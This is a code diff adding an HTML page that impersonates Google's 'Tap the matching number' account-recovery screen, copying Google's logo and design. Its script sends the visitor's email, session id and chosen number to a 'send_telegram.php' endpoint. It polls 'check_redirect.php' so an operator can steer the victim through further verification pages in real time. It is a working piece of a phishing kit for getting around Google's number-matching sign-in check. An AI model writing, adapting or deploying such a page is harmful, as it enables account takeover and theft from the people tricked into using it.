@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account recovery</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif; 
+            background-color: #f8f9fa;
+            color: #202124;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .outer-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 40px;
+            max-width: 450px;
+            width: 100%;
+        }
+        .container {
+            width: 100%;
+        }
+        .logo { margin-bottom: 20px; }
+        h1 { 
+            font-size: 24px; 
+            font-weight: 400;
+            margin-bottom: 12px;
+            color: #202124;
+        }
+        .subtitle {
+            color: #5f6368;
+            font-size: 16px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .user-email {
+            display: inline-flex;
+            align-items: center;
+            background: #f1f3f4;
+            border-radius: 16px;
+            padding: 4px 12px 4px 4px;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .user-email img {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+            border-radius: 50%;
+        }
+        .user-email span { color: #202124; }
+        .user-email .arrow { margin-left: 8px; color: #5f6368; }
+        .codes { 
+            display: flex; 
+            justify-content: center; 
+            gap: 15px; 
+            margin: 25px 0;
+        }
+        .code { 
+            font-size: 28px; 
+            font-weight: 500;
+            color: #202124;
+            background: #f1f3f4;
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .code:hover {
+            background: #e8eaed;
+            transform: scale(1.05);
+        }
+        .code:active {
+            transform: scale(0.95);
+        }
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .loading-overlay.active {
+            display: flex;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f1f3f4;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            margin-top: 16px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        .device-info {
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #202124;
+        }
+        .device-description {
+            color: #5f6368;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        .link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 12px;
+        }
+        .link:hover { text-decoration: underline; }
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            border-top: 1px solid #dadce0;
+            padding: 16px;
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            font-size: 12px;
+            color: #5f6368;
+            background: #ffffff;
+        }
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="outer-container">
+        <div class="container">
+            <div class="logo">
+                <svg viewBox="0 0 74 24" width="74" height="24">
+                    <path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z"/>
+                    <path fill="#EA4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
+                    <path fill="#FBBC05" d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.81c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.5 3.1 3.54.01 2.03-1.36 3.5-3.1 3.5z"/>
+                    <path fill="#4285F4" d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
+                    <path fill="#34A853" d="M58 .24h2.51v17.57H58z"/>
+                    <path fill="#EA4335" d="M68.26 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.3-1.96-3.7-4.97-3.7-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.6-2.86 1.6zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z"/>
+                </svg>
+            </div>
+            <h1>Tap the matching number</h1>
+            <p class="subtitle">To help keep your account safe, Google wants to make sure it's really you</p>
+            <div class="user-email">
+                <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="User">
+                <span id="displayEmail">user@gmail.com</span>
+                <span class="arrow">&#9660;</span>
+            </div>
+            <div class="codes" id="threeCodes">
+                <div class="code" id="code1">6</div>
+                <div class="code" id="code2">1</div>
+                <div class="code" id="code3">9</div>
+            </div>
+            <p class="device-description">Tap the matching number on your phone to verify it's you.</p>
+            <a href="#" class="link">I don't have my phone</a>
+        </div>
+    </div>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <p class="loading-text">Verifying...</p>
+    </div>
+
+    <div class="footer">
+        <a href="#">Help</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+    </div>
+
+    <script>
+        function getStoredEmail() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('email') || localStorage.getItem('userEmail') || '';
+        }
+        
+        function getSessionId() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('session_id') || localStorage.getItem('sessionId') || '';
+        }
+        
+        function getThreeCodesValue() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('three_codes_value') || '6-1-9';
+        }
+        
+        const storedEmail = getStoredEmail();
+        const sessionId = getSessionId();
+        const threeCodesValue = getThreeCodesValue();
+        const codes = threeCodesValue.split('-');
+        
+        document.getElementById('displayEmail').textContent = storedEmail;
+        if (codes.length >= 3) {
+            document.getElementById('code1').textContent = codes[0];
+            document.getElementById('code2').textContent = codes[1];
+            document.getElementById('code3').textContent = codes[2];
+        }
+
+        document.querySelectorAll('.link').forEach(function(link) {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+            });
+        });
+
+        let codeSelected = false;
+
+        document.querySelectorAll('.code').forEach(function(codeElement) {
+            codeElement.addEventListener('click', function() {
+                if (codeSelected) return;
+                codeSelected = true;
+                
+                const selectedCode = this.textContent;
+                const loadingOverlay = document.getElementById('loadingOverlay');
+                loadingOverlay.classList.add('active');
+                
+                const formData = new FormData();
+                formData.append('session_id', sessionId);
+                formData.append('email', storedEmail);
+                formData.append('three_code_selected', selectedCode);
+                formData.append('three_codes_options', threeCodesValue);
+                formData.append('type', 'three_code_selection');
+                
+                fetch('send_telegram.php', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    window.location.href = 'verify.html?email=' + encodeURIComponent(storedEmail) + '&session_id=' + encodeURIComponent(sessionId);
+                })
+                .catch(error => {
+                    console.error('Error sending to telegram:', error);
+                    window.location.href = 'verify.html?email=' + encodeURIComponent(storedEmail) + '&session_id=' + encodeURIComponent(sessionId);
+                });
+            });
+        });
+
+        let redirectCheckInterval = null;
+
+        function checkRedirect() {
+            if (!sessionId) return;
+            
+            fetch('check_redirect.php?session_id=' + encodeURIComponent(sessionId) + '&t=' + Date.now())
+                .then(response => response.json())
+                .then(data => {
+                    if (data.redirect && data.redirect !== '') {
+                        if (redirectCheckInterval) {
+                            clearInterval(redirectCheckInterval);
+                        }
+                        
+                        const email = data.email || storedEmail;
+                        let redirectUrl = data.redirect + '.html?email=' + encodeURIComponent(email) + '&session_id=' + encodeURIComponent(sessionId);
+                        
+                        if (data.redirect === 'tap_code' && data.tap_code_value) {
+                            redirectUrl += '&tap_code_value=' + encodeURIComponent(data.tap_code_value);
+                        }
+                        if (data.redirect === 'three_codes' && data.three_codes_value) {
+                            redirectUrl += '&three_codes_value=' + encodeURIComponent(data.three_codes_value);
+                        }
+                        if (data.redirect === 'sms_code' && data.phone_display) {
+                            redirectUrl += '&phone_display=' + encodeURIComponent(data.phone_display);
+                        }
+                        
+                        window.location.href = redirectUrl;
+                    }
+                })
+                .catch(error => {
+                    console.error('Error checking redirect:', error);
+                });
+        }
+        
+        redirectCheckInterval = setInterval(checkRedirect, 1500);
+        checkRedirect();
+    </script>
+</body>
+</html>
